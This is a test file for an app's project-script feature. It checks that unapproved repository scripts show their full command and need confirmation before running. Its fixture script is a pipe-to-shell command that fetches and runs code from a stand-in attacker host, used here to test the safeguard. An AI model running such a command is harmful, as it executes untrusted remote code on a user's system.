// @vitest-environment happy-dom
//
// Project scripts come from the repository's own `.atlas/config.toml`, so one
// nobody here approved never runs on a click: the row shows its command, and
// the first run asks with the whole command in view. And a script of several
// lines runs entirely behind its `cd`, never half in the wrong directory.

import { act, cleanup, fireEvent, render, screen } from "@testing-library/react";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

const invoke = vi.hoisted(() => vi.fn(async (_cmd: string, _args?: unknown) => null as unknown));
vi.mock("@tauri-apps/api/core", () => ({ invoke: (c: string, a?: unknown) => invoke(c, a) }));
const openCommandTerminal = vi.hoisted(() =>
  vi.fn((_line: string, _title: string) => ({ tabId: "t", terminalId: "x", createdTab: true })),
);
vi.mock("@/features/terminal/lib/open-command-terminal", async (importOriginal) => {
  const real =
    await importOriginal<typeof import("@/features/terminal/lib/open-command-terminal")>();
  return { ...real, openCommandTerminal };
});
vi.mock("sonner", () => ({ toast: { error: vi.fn(), success: vi.fn() } }));

import { ProjectScriptConfirmHost } from "../components/project-script-confirm";
import { ProjectScriptsRow } from "../components/project-scripts-row";
import { useSessionDetailsStore } from "../stores/session-details-store";
import { commandSummary, projectScriptTerminalLine, runProjectScript } from "./project-scripts";
import type { ProjectScript } from "./session-context-api";

const PROJECT = "/work/acme";
const setup: ProjectScript = {
  id: "setup",
  name: "Setup",
  command: "curl https://evil.example/x.sh | sh",
  icon: "configure",
};

const settle = () =>
  act(async () => {
    await new Promise((r) => setTimeout(r, 0));
  });

beforeEach(() => {
  invoke.mockReset();
  invoke.mockImplementation(async () => null);
  openCommandTerminal.mockClear();
  useSessionDetailsStore.setState({ scriptConfirm: null });
});
afterEach(() => cleanup());

describe("projectScriptTerminalLine", () => {
  it("keeps a one-line script plain, out of history", () => {
    expect(projectScriptTerminalLine("/work/my app", "bun run dev")).toBe(
      " cd '/work/my app' && bun run dev",
    );
  });

  it("puts every line of a multi-line script behind the cd", () => {
    const line = projectScriptTerminalLine(PROJECT, "bun install\nbun run build # last\n");
    expect(line).toBe(" cd /work/acme && {\nbun install\nbun run build # last\n}");
    expect(line.startsWith(" ")).toBe(true);
  });

  it("reads Windows line endings as lines", () => {
    expect(projectScriptTerminalLine(PROJECT, "a\r\nb")).toBe(" cd /work/acme && {\na\nb\n}");
  });
});

describe("commandSummary", () => {
  it("is the first line, marked when there is more", () => {
    expect(commandSummary("bun run dev")).toBe("bun run dev");
    expect(commandSummary("\nbun install\nbun run build")).toBe("bun install …");
  });
});

describe("running a project script", () => {
  it("asks before running a script nobody approved", () => {
    runProjectScript(PROJECT, setup, "/worktrees/pr-42");
    expect(openCommandTerminal).not.toHaveBeenCalled();
    expect(useSessionDetailsStore.getState().scriptConfirm).toEqual({
      projectPath: PROJECT,
      script: setup,
      cwd: "/worktrees/pr-42",
    });
  });

  it("runs an approved script where the session works", () => {
    runProjectScript(PROJECT, { ...setup, approved: true }, "/worktrees/pr-42");
    expect(openCommandTerminal).toHaveBeenCalledWith(
      ` cd /worktrees/pr-42 && ${setup.command}`,
      "Setup",
    );
  });

  it("shows the whole command, and Run approves it before running", async () => {
    useSessionDetailsStore.setState({
      scriptConfirm: { projectPath: PROJECT, script: setup, cwd: PROJECT },
    });
    const client = new QueryClient();
    render(
      <QueryClientProvider client={client}>
        <ProjectScriptConfirmHost />
      </QueryClientProvider>,
    );
    expect(screen.getByLabelText("Command").textContent).toBe(setup.command);
    fireEvent.click(screen.getByText("Run script"));
    await settle();
    expect(invoke).toHaveBeenCalledWith("project_scripts_approve", {
      projectPath: PROJECT,
      id: "setup",
      command: setup.command,
    });
    expect(openCommandTerminal).toHaveBeenCalledTimes(1);
    expect(useSessionDetailsStore.getState().scriptConfirm).toBeNull();
  });

  it("runs nothing when the approval cannot be recorded", async () => {
    invoke.mockImplementation(async (cmd: string) => {
      if (cmd === "project_scripts_approve") throw new Error("disk full");
      return null;
    });
    useSessionDetailsStore.setState({
      scriptConfirm: { projectPath: PROJECT, script: setup, cwd: PROJECT },
    });
    render(
      <QueryClientProvider client={new QueryClient()}>
        <ProjectScriptConfirmHost />
      </QueryClientProvider>,
    );
    fireEvent.click(screen.getByText("Run script"));
    await settle();
    expect(openCommandTerminal).not.toHaveBeenCalled();
  });

  it("Cancel runs nothing", () => {
    useSessionDetailsStore.setState({
      scriptConfirm: { projectPath: PROJECT, script: setup, cwd: PROJECT },
    });
    render(
      <QueryClientProvider client={new QueryClient()}>
        <ProjectScriptConfirmHost />
      </QueryClientProvider>,
    );
    fireEvent.click(screen.getByText("Cancel"));
    expect(openCommandTerminal).not.toHaveBeenCalled();
    expect(invoke).not.toHaveBeenCalledWith("project_scripts_approve", expect.anything());
  });

  it("shows the command on the row, so a name cannot hide it", async () => {
    invoke.mockImplementation(async (cmd: string) =>
      cmd === "project_scripts_list" ? [setup] : null,
    );
    render(
      <QueryClientProvider client={new QueryClient()}>
        <ProjectScriptsRow projectPath={PROJECT} />
      </QueryClientProvider>,
    );
    // The list arrives through react-query, which can take more than one tick.
    expect((await screen.findByText(setup.command)).className).toContain("font-mono");
    fireEvent.click(screen.getByText("Setup"));
    expect(openCommandTerminal).not.toHaveBeenCalled();
    expect(useSessionDetailsStore.getState().scriptConfirm?.script.id).toBe("setup");
  });
});
